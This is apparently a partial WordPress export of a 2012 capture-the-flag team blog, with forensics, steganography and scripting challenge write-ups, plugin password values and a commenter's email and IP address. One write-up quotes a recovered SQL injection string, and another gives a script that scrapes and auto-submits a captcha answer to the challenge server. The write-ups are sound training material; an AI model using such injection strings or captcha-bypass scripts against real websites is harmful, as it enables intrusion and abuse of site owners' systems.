		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sfw_comment_form_password</wp:meta_key>
			<wp:meta_value><![CDATA[NUed4Unlf6OO]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1</wp:comment_id>
			<wp:comment_author><![CDATA[Mr WordPress]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://wordpress.org/</wp:comment_author_url>
			<wp:comment_author_IP></wp:comment_author_IP>
			<wp:comment_date>2012-05-31 14:08:09</wp:comment_date>
			<wp:comment_date_gmt>2012-05-31 14:08:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi, this is a comment.<br />To delete a comment, just log in and view the post&#039;s comments. There you will have the option to edit or delete them.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>About</title>
		<link>http://nandynarwhals.org/about/</link>
		<pubDate>Thu, 31 May 2012 06:08:09 +0000</pubDate>
		<dc:creator>admin</dc:creator>
		<guid isPermaLink="false">http://nabe.neesan.org/?page_id=2</guid>
		<description></description>
		<content:encoded><![CDATA[SG CTF Team.

iCTF 2011
Mozilla CTF 2012
YUT Codegate prelim CTF 2012
plaidCTF 2012
HITB2012KUL CTF
Hack.lu CTF 2012
CSCAMP CTF Quals 2012
PoliCTF 2012 (as <a href="http://ctftime.org/team/3129/">Singapore Group</a>)

<a href="https://ctftime.org/team/1332/">https://ctftime.org/team/1332/</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2</wp:post_id>
		<wp:post_date>2012-05-31 14:08:09</wp:post_date>
		<wp:post_date_gmt>2012-05-31 06:08:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>about</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>page</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:postmeta>
			<wp:meta_key>_wp_page_template</wp:meta_key>
			<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sfw_comment_form_password</wp:meta_key>
			<wp:meta_value><![CDATA[8XvFxlNzanI7]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Codegate 2012:  Forensics 100</title>
		<link>http://nandynarwhals.org/2012/06/07/codegate-2012-forensics-100/</link>
		<pubDate>Wed, 06 Jun 2012 16:43:48 +0000</pubDate>
		<dc:creator>admin</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=7</guid>
		<description></description>
		<content:encoded><![CDATA["""

In order to steal financial information of Company X, IU got a job under cover. She decided to attack CFO's computer, and then insert malicious code to his computer in the way of social engineering. She figured out that he didn't use to turn off his computer, when he gets off work. After he leaves the office, she obtains financial data from his computer to search EXCEL file. By checking installed application program, she can find the information in the file. She lacks the file externally. In order to remove all traces, she erases malicious code, event logs and recent file list. The company X has to figure out what information she stole correctly to make an appropriate measure. These are files attacked from CFO's computer. Find the full path and size of the file which she stole. On the day, CFO left the office at 14:00. The time is based on Korea Standard Time(UTC +09:00).

Answer: strlwr(md5(full_path|file_size))
('|' is just a character)
<a href="http://www.mediafire.com/?8q1roxuskqhqhf9"> Download</a>

"""

We looked around a lot. Check folders, eliminated empty ones etc. The simplest way to find the stolen file is to grep for xls, strings &lt;bin file&gt; | grep xls also helps to find xls strings in a bin file. Then we came across this:<!--more-->

[bash]
yuuko@Sion:~/temp/short/Users/proneer/AppData/Local/Microsoft/Windows/History/History.IE5$ strings index.dat | grep xls
Visited: proneer@file:///C:/Data/xlsx/ITRC.xlsx
Visited: proneer@file:///C:/Data/xlsx/Result%20fo%20TESTSET.xlsx
Visited: proneer@file:///C:/Data/xlsx/
Visited: proneer@file:///C:/Data/xlsx/080904_File%20Carving%20Results_DEASII_Final%20Forensics.xlsx
Visited: proneer@file:///C:/Data/xlsx/Book1.xlsx
Visited: proneer@file:///C:/Data/xlsx/Date.xlsx
Visited: proneer@file:///C:/Data/xlsx/dd.xlsx
Visited: proneer@file:///C:/Data/xlsx/LG%20CYON.xlsx
Visited: proneer@file:///C:/Data/xlsx/Carving%ED%8C%8C%EC%9D%BC%EB%B6%84%EC%84%9D.xlsx
Visited: proneer@file:///C:/INSIGHT/Accounting/Confidential/[Top-Secret]_2011_Financial_deals.xlsx
[/bash]
^ looks interesting "Visited: proneer@file:///C:/INSIGHT/Accounting/Confidential/[Top-Secret]_2011_Financial_deals.xlsx"

It looks like it could be the stolen EXCEL file. There might be some leftover files/data with [Top-Secret]_2011_Financial_deals.xlsx somewhere. So, cd back to root of the Users folder, and do a tree | grep "Top-Secret".

[bash]
yuuko@Sion:~/temp/short/Users/proneer/AppData/Local/Microsoft/Windows/History/History.IE5$ tree ../../../../../ | grep "Top-Secret"
[Top-Secret]_2011_Financial_deals.LNK

[/bash]

There it is, a shortcut file, looks like the thief forgot to remove it. Btw, we could've did a tree -f that will print out the full path of the shortcut file. "Users/proneer/AppData/Roaming/Microsoft/Office/Recent/[Top-Secret]_2011_Financial_deals.LNK"

Hmm, a shortcut file, let's see what we can get out of it.

So we have the full path of the stolen file: C:\INSIGHT\Accounting\Confidential\[Top-Secret]_2011_Financial_deals.xlsx
The shortcut points to the same path too.
Googling "Lnk forensics" : http://www.forensicswiki.org/wiki/LNK
'Metadata: "The size of the target when it was last accessed"' Sounds like what we need.

The question asks for the the md5(full_path|file_size), we're now able to get the file_size part.

In the wiki page,
"Free tool (in PERL) that is capable of reading and reporting on Windows shortcut files"
Yea I like perl, lets check that tool out.
lnk-parse-1.0.pl MS Windows LNK file parser
<a href="http://sourceforge.net/projects/jafat/files/lnk-parse/">http://sourceforge.net/projects/jafat/files/lnk-parse/</a>
[bash]
yuuko@Sion:~/temp/short/Users/proneer/AppData/Roaming/Microsoft/Office/Recent$ perl lnk-parse-1.0.pl \[Top-Secret\]_2011_Financial_deals.LNK

Link File: [Top-Secret]_2011_Financial_deals.LNK
Link Flags: HAS SHELLIDLIST | POINTS TO FILE/DIR | NO DESCRIPTION | HAS RELATIVE PATH STRING | NO WORKING DIRECTORY | NO CMD LINE ARGS | NO CUSTOM ICON |
File Attributes: ARCHIVE
Create Time: Sun Feb 12 2012 13:39:49
Last Accessed time: Sun Feb 12 2012 13:39:49
Last Modified Time: Wed Jan 07 2009 12:17:41
Target Length: 9296
Icon Index: 0
ShowWnd: 1 SW_NORMAL
HotKey: 0
Target is on local volume
Volume Type: Fixed (Hard Disk)
Volume Serial: 8ce8c6c4
Vol Label:
Base Path: C:\INSIGHT\Accounting\Confidential\[Top-Secret]_2011_Financial_deals.xlsx
(App Path:) Remaining Path:
Relative Path: ..\..\..\..\..\..\..\INSIGHT\Accounting\Confidential\[Top-Secret]_2011_Financial_deals.xlsx
[/bash]
<pre> Target Length: 9296</pre>
There we have it, the filesize of the stolen file.

lowercase(md5(C:\INSIGHT\Accounting\Confidential\[Top-Secret]_2011_Financial_deals.xlsx|9296))

and we have the answer: <strong>d3403b2653dbc16bbe1cfce53a417ab1</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>7</wp:post_id>
		<wp:post_date>2012-06-07 00:43:48</wp:post_date>
		<wp:post_date_gmt>2012-06-06 16:43:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>codegate-2012-forensics-100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="codegate"><![CDATA[Codegate]]></category>
		<category domain="post_tag" nicename="codegate-2012"><![CDATA[codegate 2012]]></category>
		<category domain="category" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="writeup"><![CDATA[writeup]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sfw_comment_form_password</wp:meta_key>
			<wp:meta_value><![CDATA[bsF1H5kR8nMM]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Codegate 2012: Forensics 200</title>
		<link>http://nandynarwhals.org/2012/06/07/codegate-2012-forensics-200/</link>
		<pubDate>Wed, 06 Jun 2012 16:51:47 +0000</pubDate>
		<dc:creator>admin</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=14</guid>
		<description></description>
		<content:encoded><![CDATA[Forensics 200

"""

When IU who lives in Seoul tried to do SQL Injection attack a certain WEB site, suddenly the browser was closed abnormally. What is the SQL Injection value she tried to enter and when the browser was closed? The time is based on Korea Standard Time(UTC +09:00)
Time Format is YYYY-MM-DDThh:mm:ssTZD (TZD : +hh:mm or hh:mm)

Answer : injection_value|time
('|' is just a character)
Convert ' ' to '_' for injection value.

<a href="http://www.mediafire.com/?73h80p44468z448">Download</a>
"""
<!--more-->
So we check out the folders of the various browsers. Found an interesting link to
http://docbe.com/2012/01/05/web-browser-session-restore-forensics-3/

So we decided to see if that helps. First up Firefox Recovery: Mozilla Session Restore
Followed the instructions in the pdf from the above link, and there it is:
C:\Users\UserName\AppData\Roaming\Mozilla\Firefox\Profiles\########.default\sessionstore.js

According to the document, sessionstore.js is created when the browser force restarts. sessionstore.js will be deleted when the browser shuts down normally.
So we took a look at the sessionstore.js which is in json. <a href="http://jsoneditor.net/">http://jsoneditor.net/</a> &lt; Using this makes things easier. I cat-ed the file though.
And look what we found (excerpt, full one at the bottom of the post):
[javascript]formdata":{"//xhtml:li[@id='search-3']/xhtml:div/xhtml:form/xhtml:fieldset/xhtml:input[@name='s']":"1_UNI/**/ON_SELECT"}[/javascript]
&gt;1_UNI/**/ON_SELECT

&lt;Hiromi&gt; well lets see
&lt;Hiromi&gt; "1_UNI/**/ON_SELECT"
&lt;Hiromi&gt; does that smell like sqli?
&lt;amon&gt; OHH
&lt;amon&gt; yes

There we found the sqli. Now for the timing since Answer : injection_value|time
There are 4 epoch/unix timestamps in the file. We converted them to Time Format is YYYY-MM-DDThh:mm:ssTZD (TZD : +hh:mm or hh:mm) and tried them out.

<strong>1_UNI/**/ON_SELECT|2012-02-12T10:23:17+09:00</strong>

And there we have the answer.

<a href="http://pastebin.com/Lr8WsWf4">sessionstore.js</a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>14</wp:post_id>
		<wp:post_date>2012-06-07 00:51:47</wp:post_date>
		<wp:post_date_gmt>2012-06-06 16:51:47</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>codegate-2012-forensics-200</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="codegate"><![CDATA[Codegate]]></category>
		<category domain="post_tag" nicename="codegate-2012"><![CDATA[codegate 2012]]></category>
		<category domain="category" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="post_tag" nicename="writeup"><![CDATA[writeup]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sfw_comment_form_password</wp:meta_key>
			<wp:meta_value><![CDATA[nKMRNXMXA8QB]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0df2051f5f17899f3428a405a2536b38</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2</wp:comment_id>
			<wp:comment_author><![CDATA[MrJ]]></wp:comment_author>
			<wp:comment_author_email>jacob.soo@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>175.156.216.92</wp:comment_author_IP>
			<wp:comment_date>2012-10-11 22:56:16</wp:comment_date>
			<wp:comment_date_gmt>2012-10-11 14:56:16</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Hi,

good show put up by you guys in HiTB CTF.
Care to reply to my email please?

Thanks]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>DSTA&#039;s CDDC Competition Writeup</title>
		<link>http://nandynarwhals.org/?p=21</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=21</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>21</wp:post_id>
		<wp:post_date>2012-06-09 14:33:03</wp:post_date>
		<wp:post_date_gmt>0000-00-00 00:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name></wp:post_name>
		<wp:status>draft</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sfw_comment_form_password</wp:meta_key>
			<wp:meta_value><![CDATA[bLshHrARpsPN]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>HITB2012KUL CTF Stuffs</title>
		<link>http://nandynarwhals.org/2012/10/16/hitb2012kul-ctf-stuffs/</link>
		<pubDate>Tue, 16 Oct 2012 11:35:34 +0000</pubDate>
		<dc:creator>admin</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=27</guid>
		<description></description>
		<content:encoded><![CDATA[[caption id="" align="aligncenter" width="553"]<a href="http://i.imgur.com/f5UKQ.jpg"><img class="  " src="http://i.imgur.com/f5UKQ.jpg" alt="" width="553" height="415" /></a> Source http://securitymy.tumblr.com/[/caption]

Daemons <a href="https://github.com/klks/hitb2012kul-CTF-Daemons">https://github.com/klks/hitb2012kul-CTF-Daemons</a>

Event Logs <a href="http://pastebin.com/raw.php?i=jCEmWbF7">pastebin</a> [<a href="http://securitymy.tumblr.com/post/33699123682/hitb2012kul-ctf-event-logs">source</a>]

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>27</wp:post_id>
		<wp:post_date>2012-10-16 19:35:34</wp:post_date>
		<wp:post_date_gmt>2012-10-16 11:35:34</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hitb2012kul-ctf-stuffs</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="ctf"><![CDATA[CTF]]></category>
		<category domain="category" nicename="hitb"><![CDATA[HITB]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 - HugeCaptcha (PPC100)</title>
		<link>http://nandynarwhals.org/2012/10/18/hack-you-ctf-2012-ppc100/</link>
		<pubDate>Thu, 18 Oct 2012 15:50:33 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=33</guid>
		<description></description>
		<content:encoded><![CDATA[<p style="text-align: center;"><a href="http://nandynarwhals.org/wp-content/uploads/2012/10/ppc100-1.png"><img class="size-full wp-image-36 aligncenter" title="ppc100-1" src="http://nandynarwhals.org/wp-content/uploads/2012/10/ppc100-1.png" alt="These add up." width="552" height="150" /></a></p>
PPC100 is a puzzle that requires some degree of scripting. To obtain the flag, we have to add up the two large numbers given and submit the result through POST within an extremely short time limit.

The exploit is as follows (solve_ppc100.py):

[python]
import requests, re

p1 = re.compile("(\d+) \+ (\d+)")
p2 = re.compile("name=\'trueanswer\' value=\'(\w+)\'")
r = requests.get("http://misteryou.ru/ppc100/")

res1 = p1.search(r.text)
n1 = res1.group(1)
n2 = res1.group(2)
ans = int(n1) + int(n2)

res2 = p2.search(r.text)
ta = res2.group(1)

payload = {'captchatype': 'hugecaptcha', 'trueanswer': ta, 'answer': str(ans)}
r2 = requests.post("http://misteryou.ru/ppc100/", data=payload)

p3 = re.compile("(\d{7})")
secret = "".join(chr(int(i,2)) for i in p3.findall(r2.text))

print secret
[/python]

Executing the python script:

[shell]
amon@Alyx:~/hackyou/ppc100$ python solve_ppc100.py
killallhumans
amon@Alyx:~/hackyou/ppc100$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>33</wp:post_id>
		<wp:post_date>2012-10-18 23:50:33</wp:post_date>
		<wp:post_date_gmt>2012-10-18 15:50:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-ctf-2012-ppc100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Hack You 2012 – Stego 100 (STG100)</title>
		<link>http://nandynarwhals.org/2012/10/19/hack-you-2012-stego-100-stg100/</link>
		<pubDate>Thu, 18 Oct 2012 16:40:41 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/?p=47</guid>
		<description></description>
		<content:encoded><![CDATA[In this challenge, we were given the following text in a file (stg100):

[text]
The giant panda (Ailuropoda melanoleuca, meaning "black and white cat-foot") is a type of bear. It lives in bamboo forests in central China. The giant panda is an endangered animal. In November 2007, China had 239 giant pandas who lived in captivity. There are 27 giant pandas which live in zoos outside of China. The exact number of giant pandas in the wild is not known. Some sources say there are about 1,590, other sources give a number between 2,000 and 3,000. The number of giant pandas in the wild seems to be increasing.

Giant pandas are about 1.2–1.5 m long and about 75 cm high. They weigh between 75 and 160 kg. Giant pandas have white fur on their bodies and black fur on their legs and shoulders. They also have black ears and black patches around their eyes. Pandas can climb and swim well.

Giant pandas are born with pink skin, with black areas on the legs, ears, and eyes. They are usually born with a small amount of white fur. They get more fur when they are about nine months old.

Giant pandas live alone. Females have a territory which they deFend against other females. When female pandas are ready to mate, they give off a special scent and make a loud bLeating noise to tell the males that they are ready. Giant pandAs mate between the months of March and May which is the Summer months in China. If there are several males, they fight each other. The one who wins – the stronGest male, then mates with the female. In August or September, the female gIves birth to one or two babies. If she has two babies, she will only raise one baby, and the other baby dies, no-one really knows how the female panda chooSe between the two. Giant panda babies are very small, and weigh only 90–130 grams, which is about 1/900 of its mother's weight. The baby drinks milk until it is 8–9 months old. Young pandas live with their mothers until they are 18–24 months old. They become mature when they are 5–7 years old. They live around 20 years in the wild and up to 30 years in captivity (e.g. in zoos). Unlike other bears, pandas do not hibernate.

Today, the giant panda is seen as a symbol for China. It is also protected by the ChineSe government, and killing a panda is a crime. ThE giant panda is now under the threat of eXtinction, and it will die out if the forests of bamboo continue to disappear.

People outside of eastern Asia did not know about the giant panda until 1869. The first "Westerner" to see a live panda was a German zoologist in 1916. In 1936, Ruth Harkness became the first Westerner to bring a live giant panda out of China. It was a cub (babY panda) named Su-Lin. The cub was taken to live at the Brookfield Zoo in Chicago.

In the 1970s, China began showing giant pandaS in zoos in the UniTed States and Japan as a type of diplomacy. This happened until 1984, when China changEd how this was done. Starting in 1984, China would allow zoos to keep the giant pandas for 10 years, but the zoo would have to pay China up to $1,000,000 each year. Also, the zoo would have to aGree that any cubs born would belong to China.

Although their bodies are made to eat meat, giant pandas are mostly herbivOrous. Their main source of food is bamboo. Because pandas have the digestive system of carnivores and can not digest cellulose very well, they get little energy and protein from the bamboo they eat. Because they get very little nutrition from bamboo, they must eat a lot. Pandas commonly eat 20 to 30 pounds of bamboo a day to get the nutrition they need. Although there are more than 200 different varieties of bamboo the Panda will only eat 20 varieties. Pandas sometimes run out of food, as a tyPe of bamboo flowers, die, and regrow again at the same time.

As of 2008, the giant bear is an endangered animal. The main problem they have is habitat loss. Habitat loss is when the places they live in are ruined. Humans often ruin the places where pandas live, such as for the construction of buildings. Pandas cAn also lose their habitat because of pollution. Pollution means that less bamboo grows, or that bamboo stops growing completely in a certain place. Giant pandas also have a low birth rate, which makes the problem worse.

TraditioNal Chinese stories about the giant pandas say that the animal can be very powerful. Some people believe that sleeping on a panda skin can protect them from ghost and predict their future. These tales are one of the reasons why people would spend lots of money for the skin and fur of this precious animal.

In former times, the panDas were also hunted. The Western people who came to China were soon unable to hunt the pandas, because of different wars. Local people continued though. PandAs were mainly hunted for their fur. Today, hunting pandas is not allowed.

In 1963, China set up a nature reserve for pandas, the Wolong National Nature Reserve. This was the firSt, other nature reserves followed. China did this to fight the number of pandas going down. In 2006, there were 40 panda reserves, compared to 13, two decades ago.
[/text]

It gets pretty obvious what the encryption scheme is; take the word 'stronGest' for example. Certain letters that aren't meant to be capitalised are capitalised. What have to do now is simply extract these letters.<!--more-->

The following python script (solve_stg100.py) extracts the letters by checking if the previous letter is not a whitespace or a separating character and that the current letter is capitalised. If these conditions are met, then we add the letter to our list to create the string containing our flag.

[python]
data = file("stg100").read()
previous = ""
whitespace = ["", " ", "\t", "\n", "\"", "(", "-"]
secret = ""

for i in data:
if previous not in whitespace:
if i.isupper():
secret = secret + i
previous = i

print secret
[/python]

The script in action:

[shell]
amon@Alyx:~/hackyou/stg100$ python solve_stg100.py
FLAGISSEXYSTEGOPANDAS
amon@Alyx:~/hackyou/stg100$
[/shell]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>47</wp:post_id>
		<wp:post_date>2012-10-19 00:40:41</wp:post_date>
		<wp:post_date_gmt>2012-10-18 16:40:41</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>hack-you-2012-stego-100-stg100</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="hackyou"><![CDATA[HackYou]]></category>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-28 15:30:32</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-mini-zombie-business/screenshot-at-2012-10-28-153032/</link>
		<pubDate>Sun, 28 Oct 2012 07:33:38 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-153032.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>170</wp:post_id>
		<wp:post_date>2012-10-28 15:33:38</wp:post_date>
		<wp:post_date_gmt>2012-10-28 07:33:38</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-28-153032</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>159</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-153032.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-28-153032.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
			<wp:meta_value><![CDATA[a:6:{s:5:"width";s:4:"1366";s:6:"height";s:3:"768";s:14:"hwstring_small";s:23:"height='71' width='128'";s:4:"file";s:43:"2012/10/Screenshot-at-2012-10-28-153032.png";s:5:"sizes";a:6:{s:9:"thumbnail";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-153032-150x150.png";s:5:"width";s:3:"150";s:6:"height";s:3:"150";}s:6:"medium";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-153032-300x168.png";s:5:"width";s:3:"300";s:6:"height";s:3:"168";}s:5:"large";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-153032-1024x575.png";s:5:"width";s:4:"1024";s:6:"height";s:3:"575";}s:14:"post-thumbnail";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-153032-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"large-feature";a:3:{s:4:"file";s:44:"Screenshot-at-2012-10-28-153032-1000x288.png";s:5:"width";s:4:"1000";s:6:"height";s:3:"288";}s:13:"small-feature";a:3:{s:4:"file";s:43:"Screenshot-at-2012-10-28-153032-500x281.png";s:5:"width";s:3:"500";s:6:"height";s:3:"281";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Screenshot at 2012-10-28 03:01:39</title>
		<link>http://nandynarwhals.org/2012/10/28/hack-lu-ctf-2012-mini-zombie-business/screenshot-at-2012-10-28-030139/</link>
		<pubDate>Sun, 28 Oct 2012 07:40:39 +0000</pubDate>
		<dc:creator>amon</dc:creator>
		<guid isPermaLink="false">http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030139.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>172</wp:post_id>
		<wp:post_date>2012-10-28 15:40:39</wp:post_date>
		<wp:post_date_gmt>2012-10-28 07:40:39</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>closed</wp:ping_status>
		<wp:post_name>screenshot-at-2012-10-28-030139</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>159</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<wp:attachment_url>http://nandynarwhals.org/wp-content/uploads/2012/10/Screenshot-at-2012-10-28-030139.png</wp:attachment_url>
		<wp:postmeta>
			<wp:meta_key>_wp_attached_file</wp:meta_key>
			<wp:meta_value><![CDATA[2012/10/Screenshot-at-2012-10-28-030139.png]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
